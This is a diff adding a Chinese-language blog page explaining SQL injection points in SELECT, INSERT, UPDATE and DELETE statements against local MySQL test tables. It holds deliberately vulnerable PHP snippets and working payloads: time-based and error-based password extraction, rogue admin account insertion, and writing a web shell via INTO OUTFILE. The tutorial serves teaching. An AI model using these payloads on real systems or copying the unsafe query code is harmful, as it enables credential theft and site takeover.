@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>SQL注入漏洞底层原理解析(注入点原理) | Welcome to C1yas0's Blog</title>
+  <meta name="author" content="C1yas0" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="sql注入" />
+  
+  <meta name="description" content="sql注入是一种常见的漏洞，大部分人只知道sql注入漏洞是由于sql语句过滤不够严谨所导致的，但是为什么过滤不严谨就会造成sql注入，对于这个问题，我们今天就来深挖一下sql注入产生的根本原因—–深入研究注入点。我再本地创建了两个表(命名和数据没有任何含义纯属瞎编的)Mysql版本5.1.60第一个表：news，可以理解为存储新闻信息的表，是理论上允许客户访问使用的数据库，里面并不存储敏感信息。第">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入漏洞底层原理解析(注入点原理)">
+<meta property="og:url" content="http://example.com/2020/12/10/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90(%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8E%9F%E7%90%86)/index.html">
+<meta property="og:site_name" content="Welcome to C1yas0&#39;s Blog">
+<meta property="og:description" content="sql注入是一种常见的漏洞，大部分人只知道sql注入漏洞是由于sql语句过滤不够严谨所导致的，但是为什么过滤不严谨就会造成sql注入，对于这个问题，我们今天就来深挖一下sql注入产生的根本原因—–深入研究注入点。我再本地创建了两个表(命名和数据没有任何含义纯属瞎编的)Mysql版本5.1.60第一个表：news，可以理解为存储新闻信息的表，是理论上允许客户访问使用的数据库，里面并不存储敏感信息。第">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/12/10/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90(%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8E%9F%E7%90%86)/https:/ae03.alicdn.com/kf/H6ebdf065ea3f45e98c482f3072034d5aj.png">
+<meta property="article:published_time" content="2020-12-10T21:06:06.000Z">
+<meta property="article:modified_time" content="2021-08-01T04:20:09.457Z">
+<meta property="article:author" content="C1yas0">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/12/10/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90(%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8E%9F%E7%90%86)/https:/ae03.alicdn.com/kf/H6ebdf065ea3f45e98c482f3072034d5aj.png">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Ciyaso">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771?spm=1000.2115.3001.5343">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Welcome to C1yas0&#39;s Blog</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Welcome to C1yas0&#39;s Blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <div class="kratos-post-content">
+            <h2 class="title-h2 text-center">SQL注入漏洞底层原理解析(注入点原理)</h2>
+            <p>sql注入是一种常见的漏洞，大部分人只知道sql注入漏洞是由于sql语句过滤不够严谨所导致的，但是为什么过滤不严谨就会造成sql注入，对于这个问题，我们今天就来深挖一下sql注入产生的根本原因—–深入研究注入点。<br>我再本地创建了两个表(命名和数据没有任何含义纯属瞎编的)<br>Mysql版本5.1.60<br>第一个表：news，可以理解为存储新闻信息的表，是理论上允许客户访问使用的数据库，里面并不存储敏感信息。<br><img src="https://img-blog.csdnimg.cn/20210714101036918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二个表：ps，用于账号管理的表，里面有管理员账号，有敏感信息。<br><img src="https://img-blog.csdnimg.cn/2021071410120133.png" alt="在这里插入图片描述"></p>
+<h2 id="一、SELECT注入"><a href="#一、SELECT注入" class="headerlink" title="一、SELECT注入"></a>一、SELECT注入</h2><p><strong>PS:在select中举例的数据库不是我本地所建的那两个，这个属于虚构，主要是提供一种思想</strong><br>SELECT语句用于数据表记录的查询，常在界面展示过程中使用，如新闻的内容、界面的展示等。</p>
+<h3 id="1-注入点在select-expr"><a href="#1-注入点在select-expr" class="headerlink" title="1.注入点在select_expr"></a>1.注入点在select_expr</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);</span><br><span class="line">	$res = mysqli_query($conn,&quot;SELECT $&#123;_GET[&#x27;id&#x27;]&#125;,content FROM wp_user&quot;); </span><br><span class="line">    											#content是数据库元素,wp_user是数据库名</span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line">	echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;title&#x27;].&quot;&lt;/h1&gt;&quot;; #title是数据库元素</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;content&#x27;].&quot;&lt;/h1&gt;&quot;;  #content是数据库元素</span><br><span class="line">	echo &quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以采用时间盲注，更优解：AS别名方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=(select pwd from wp_user) as title  #title是数据库元素</span><br></pre></td></tr></table></figure>
+
+<p><strong>PS:如果注入点有反引号包裹，那么需要先闭合反引号。</strong></p>
+<h3 id="2-注入点在table-referencee"><a href="#2-注入点在table-referencee" class="headerlink" title="2.注入点在table_referencee"></a>2.注入点在table_referencee</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);</span><br><span class="line">	$res = mysqli_query($conn,&quot;SELECT title FROM $&#123;_GET[&#x27;table&#x27;]&#125;&quot;);</span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line">	echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;title&#x27;].&quot;&lt;/h1&gt;&quot;; #title是数据库元素</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;content&#x27;].&quot;&lt;/h1&gt;&quot;;  #content是数据库元素</span><br><span class="line">	echo &quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以用AS别名法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=SELECT pwd AS title FROM wp_user #pwd是密码 wp_user是数据库名 </span><br></pre></td></tr></table></figure>
+
+<p><strong>PS:如果注入点有反引号包裹，那么需要先闭合反引号。</strong></p>
+<h3 id="3-注入点在WHERE或HAVING后"><a href="#3-注入点在WHERE或HAVING后" class="headerlink" title="3.注入点在WHERE或HAVING后"></a>3.注入点在WHERE或HAVING后</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);</span><br><span class="line">	$res = mysqli_query($conn,&quot;SELECT title FROM wp_news WHERE id= $&#123;_GET[&#x27;id&#x27;]&#125;&quot;);</span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line">	echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;title&#x27;].&quot;&lt;/h1&gt;&quot;; #title是数据库元素</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;content&#x27;].&quot;&lt;/h1&gt;&quot;;  #content是数据库元素</span><br><span class="line">	echo &quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。</p>
+<p>HAVING与之相似</p>
+<h3 id="4-注入点在GROUP-BY-或-ORDER-BY-后"><a href="#4-注入点在GROUP-BY-或-ORDER-BY-后" class="headerlink" title="4.注入点在GROUP BY 或 ORDER BY 后"></a>4.注入点在GROUP BY 或 ORDER BY 后</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);</span><br><span class="line">	$res = mysqli_query($conn,&quot;SELECT title FROM wp_news GROUP BY $&#123;_GET[&#x27;title&#x27;]&#125;&quot;);</span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line">	echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;title&#x27;].&quot;&lt;/h1&gt;&quot;; #title是数据库元素</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;content&#x27;].&quot;&lt;/h1&gt;&quot;;  #content是数据库元素</span><br><span class="line">	echo &quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>?ititle=id desc,(if(1,sleep(5),1))</p>
+<p>可以让页面睡眠5秒，可以利用这一特点进行基于时间的注入。</p>
+<p>ORDER BY与之相似</p>
+<h3 id="5-注入点在LIMIT后"><a href="#5-注入点在LIMIT后" class="headerlink" title="5.注入点在LIMIT后"></a>5.注入点在LIMIT后</h3><p>通过改变数字的大小，页面会显示更多或者更少的记录数。</p>
+<p>在整个SQL语句没有ORDER BY 关键字的情况下，可以直接使用UMION注入。</p>
+<h4 id="通过加入PROCEDURE可以进行注入"><a href="#通过加入PROCEDURE可以进行注入" class="headerlink" title="通过加入PROCEDURE可以进行注入"></a>通过加入PROCEDURE可以进行注入</h4><p>​        <strong>PS:只适用于Mysql5.1.5以后，Mysql5.6以前的版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from ps limit 2 procedure analyse(extractvalue(1,concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210714101243663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>配合和报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from ps limit 2 procedure analyse(extractvalue(1,concat(0x7e,(select password from ps limit 1,1),0x7e)),1);</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210714101257127.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from ps limit 2 procedure analyse(extractvalue(1,concat(0x7e,(操作代码),0x7e)),1);</span><br></pre></td></tr></table></figure>
+
+<h4 id="INTO-OUTFILE写入web’shell"><a href="#INTO-OUTFILE写入web’shell" class="headerlink" title="INTO OUTFILE写入web’shell"></a>INTO OUTFILE写入web’shell</h4><p>在有写入权限的特定情况条件下，可以使用 INTO OUTFILE向web目录写入webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 into outfile &#x27;C:\Users\ASUS\Desktop\oet.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、INSERT注入"><a href="#二、INSERT注入" class="headerlink" title="二、INSERT注入"></a>二、INSERT注入</h2><p>INSERT语句是插入数据记录的语句，常在添加新闻、用户注册、回复评论的地方出现。</p>
+<h3 id="1-注入点在tbl-name"><a href="#1-注入点在tbl-name" class="headerlink" title="1.注入点在tbl_name"></a>1.注入点在tbl_name</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);</span><br><span class="line">$res = mysqli_query($conn,&quot;insert into &#123;$_GET[&#x27;table&#x27;]&#125; values(6,&#x27;new2&#x27;,&#x27;new3&#x27;,&#x27;new4&#x27;)&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>开发者目的是控制news值为news，然后插入信息3，new2，new3</p>
+<p><em>news中原有的内容</em><br><img src="https://img-blog.csdnimg.cn/20210714101327712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>开发者理想情况：<br><img src="https://img-blog.csdnimg.cn/20210714101341958.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210714101352205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然而我们可以构建paload在ps表中创建账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?table=ps values(4,&#x27;newadmin&#x27;,&#x27;newpassword&#x27;)&quot;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210714101408257.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210714101413901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="2-注入点在VALUES"><a href="#2-注入点在VALUES" class="headerlink" title="2.注入点在VALUES"></a>2.注入点在VALUES</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO ps VALUES(9,&#x27;ababa&#x27;,&#x27;321&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210714101428503.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210714101437138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以先闭合单引号，然后再插入一条记录，通过管理员和普通用户在同一个表，此时可以通过表字段来控制管理员权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO ps VALUES(9,&#x27;ababa&#x27;,&#x27;321&#x27;),(10,&#x27;newadmin&#x27;,&#x27;newpassword&#x27;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210714101513338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101503723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>在某些情况，我们也可以将数据插入能回显的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO ps VALUES(11,&#x27;babababa&#x27;,&#x27;789&#x27;),(12,&#x27;afa&#x27;,(select VERSION()));</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210714101525888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101537334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里也可以执行select语句但是要注意不能在插入的表内查询此表不然会报错</p>
+<p><del>INSERT INTO ps VALUES(7,’babababa’,’789’),(8,’afa’,(select password from ps limit 1,1));</del></p>
+<p>报错：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101551393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70"></p>
+<p>更改一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO news VALUES(7,&#x27;babababa&#x27;,&#x27;789&#x27;,&#x27;asdas&#x27;),(8,&#x27;afa&#x27;,(select password from ps limit 0,1),&#x27;asfasfas&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210714101607772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到 ps 表中的密码成功被写入news表中</p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101618764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101627676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="三、UPDATE注入"><a href="#三、UPDATE注入" class="headerlink" title="三、UPDATE注入"></a>三、UPDATE注入</h2><p>UPDATE语句适用于数据库的更新，如用户修改自己的文章、介绍信息、更新信息等。</p>
+<p>假设我们可以操作的位置时id=多少</p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101638463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210714101647697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我们可以更改其列名，以方便我们利用，</p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101702421.png" alt="在这里插入图片描述"></p>
+<p>思考一下我们输入id时不知道id对应的字段名是多少的，我们在改id的同时将某一列的字段更改，那么我们就可以根据我们更改的这个字段查询这一整条信息，或者借此更改管理员密码，实现管理员账号的登录。</p>
+<h2 id="四、DELETE注入"><a href="#四、DELETE注入" class="headerlink" title="四、DELETE注入"></a>四、DELETE注入</h2><p>DELETE语句的作用是删除某个表全部或指定行的数据。 </p>
+<p>DELETE注入多在WHERE之后，注入语句如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = mysqli_query($conn,&quot;DELETE FROM ps WHERE id =&#123;$_GET[&#x27;id&#x27;]&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>为了防止在注入时删除数据，我们可以在后面加 <code>and sleep(1)</code> 让语句不报错却又无法正常执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from ps where id=11 and sleep(1);</span><br></pre></td></tr></table></figure>
+
+<p>执行前：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210714101730915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>执行中：<br><img src="https://img-blog.csdnimg.cn/20210714101737969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>执行后：<br><img src="https://img-blog.csdnimg.cn/20210714101747101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>再次基础上我们结合报错注入就可以实现语句的查询：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/112771788">详细的报错注入方法看这篇文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from news where i=1 and sleep(5) and extractvalue(null,concat(0x7e,(操作代码),0x7e));</span><br></pre></td></tr></table></figure>
+
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from news where i=1 and sleep(5) and extractvalue(null,concat(0x7e,(select version()),0x7e));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210714101758648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from news where i=1 and sleep(5) and extractvalue(null,concat(0x7e,(select password from ps limit 1,1),0x7e));    </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210714101808268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>参考文献《从0到1》 NULL战队 著</p>
+
+        </div>
+        <footer class="kratos-entry-footer clearfix">
+            <div class="footer-tag clearfix">
+                <div class="pull-date">
+                <span>最后编辑：2021-08-01</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
